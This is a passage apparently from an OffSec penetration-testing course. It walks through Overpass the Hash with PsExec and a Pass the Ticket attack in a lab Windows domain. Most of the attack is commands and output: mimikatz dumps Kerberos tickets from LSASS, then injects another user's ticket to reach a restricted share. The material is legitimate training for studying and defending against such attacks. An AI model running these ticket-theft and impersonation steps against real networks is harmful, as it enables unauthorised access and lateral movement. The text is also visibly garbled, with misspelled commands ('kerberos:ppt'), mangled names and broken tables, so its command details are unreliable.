
# OffSec

```
Client: jen @CORP.COM
Server: cifs04 @CORP.COM
Kerbdicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
Ticket Flags 0x40a1000 -> forwardable renewable pre_auth name_canonical
Start Time: 2/27/2023 15:27:28 (local)
End Time: 2/27/2023 15:27:28 (local)
Renew Time: 3/6/2023 5:27:28 (local)
Session Key Type: AES-256-CTS-HMAC-SHA1-96
Cache Flags: 0
Kdc Called: DC1.corp.com
Listing 844 - Mapping a network share on a remote server and listing Kerberos tickets
```

The output indicates that the net command was successful. We then used list to the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet System (CIFS) service.

> We did not use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We have now connected the NTLM hash into Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) as the official PsExec application from Microsoft.¹¹⁵⁹

PsExec can run a command but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of jen in the PowerShell session, we reuse the TGT to obtain code execution on the files04 host.

Let's try now, running \PsExec.exe to launch cmd remotely on the \files04 machine as jen.

```
PS C:\Windows\system32> cd \tools\SysinternalsSuite\
PS C:\Windows\SysinternalsSuite> .PsExec.exe \files04 cmd
```

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russovich
Sysinternals - www.sysinternals.com

Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

```
C:\Windows\system32>whoami
corp\jen
```

```
C:\Windows\system32>hostname
FILES04
```

Listing 845 - Opening remote connection using Kerberos

¹¹⁵⁹ (Microsoft, 2016), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

PWK - © 2023 OffSec Services Limited. All rights reserved.

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server.

Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user.

## 23.1.5 Pass the Ticket

In the previous section, we used the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate as Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The *Pass the Ticket* attack takes advantage of the TGS, which can be exported and re-else on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of *ave*. The dave user has privilege access to the backup folder on WEB04 where our logged in *jen* does not.

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject *ave*'s TGT into our own session. This will allow us to access the restricted folder.

Let's first log in as *jen* to CLIENT76 and verify that we are able to access the resource on WEB04. To do, we will list the content of the \web04\backup folder from an administrative PowerShell command line.

```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
Access to the path '\web04\backup' is denied.
At line:1
+ ls \\web04\backup
  CategoryInfo:PermissionDenied
  FullyQualifiedError:PowerShell.ChildItem
```

Listing 846 - Verify that the user jen has no access to shared folder

Confirming that *jen* has no access to restricted folder, we can now launch mimikatz, enable debug, and dump all the TGT/TGS from memory with sekurlsa:tickets /export

```
Authentication ID : 0:28372860000000:01f626
Session from 0
User Name : dave
Domain : CORP
Logon : DC1
Logon Time : 9/14/2022 5:24:17 AM
SID : 1-5-21-19873027-65890505-17814369-1
```

# Penetration Testing with Kali Linux

- Username : dave
- Domain : CORP.COM
- Password : (null)
- Group 0 - Ticket Granting
- Group 1 - Client Ticket
- Group 2 - Ticket Granting Ticket
- 0000000
- Start/End/MaxRenew : 9/14/2022 5:24:17 AM ; 9/14/2022 5:24:17 PM ; 9/14/2022 5:24:17 AM
- Service Name (02) : krbtgt @ CORP_COM@CORP_COM
- Target Name (02) : krbtgt @ CORP_COM
- Client Name (01) : dave @ CORP_COM
- Flags 0xc10000 : name_canonical ; initial ; renewable ; forwardable
- Session Key : 0x00080012aes256-hmacf0259e075f3a08467369366374dc71f25ba294db60528f04196475fe
- Ticket : 0x00080012aes256-hmacSaved file: [0f1f261]-2-4-a0c1000-dave@krbtgt-CORP.COM.kirbi

Listing 847 - Exporting Kerberos TGT/TGS to disk

The above command exports the LSASS Kerberos ticket in memory for any TGT/TGS, which is then saved to disk in the kirbi format that initiated a session, we can try to inject one of the tickets into the user's sessions.

We can verify newly generated tickets with dir, filtering out the kirbi extension.

```
PS C:\> dir *.kirbi
```

| Mode | LastWriteTime | Length | Name |
|------|--------------|--------|------|
| -a---- | 9/14/2022 5:24 AM | 1561 | [0;12bd0]-0-0-40810000-dave@cifs |
| web04.kirbi | 9/14/2022 5:24 AM | 1505 | [0;12bd0]-2-0-40c10000-dave@krbtgt |
| -a---- | 9/14/2022 5:24 AM | 1561 | [0;1c680]-0-0-40810000-dave@cifs |
| web04.kirbi | 9/14/2022 5:24 AM | 1505 | [0;1c680]-2-0-40c10000-dave@krbtgt |
| -a---- | 9/14/2022 5:24 AM | 1561 | [0;1c7bcc]-0-0-40810000-dave@cifs |
| web04.kirbi | 9/14/2022 5:24 AM | 1505 | [0;1c7bcc]-2-0-40c10000-dave@krbtgt |

Listing 848 - Injecting the selected TGS into process

As many tickets have been generated, we can just pick any TGS ticket and inject it through the kerberos:ppt command.

```
kerberos:ppt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

Listing 849 - Inspecting the ticket in memory

We notice that the ticket has been successfully imported in our session for the jen user.

Let's confirmed that we have granted access to the restricted shared folder.

```
PS C:\Tools> \web04\backup
```

```
Directory: \web04\backup
```

| Mode | LastWriteTime | Name |
|------|--------------|------|
| -a---- | 9/13/2022 | 2:52 AM | 0 backup_schema.txt |

Listing 851 - Accessing the shared folder through the injected ticket

Awesome! We managed to successfully access the folder by impersonating dave's identity by injecting their authentication token into our user's process.

PWK - © 2023 OffSec Services Limited. All rights reserved.
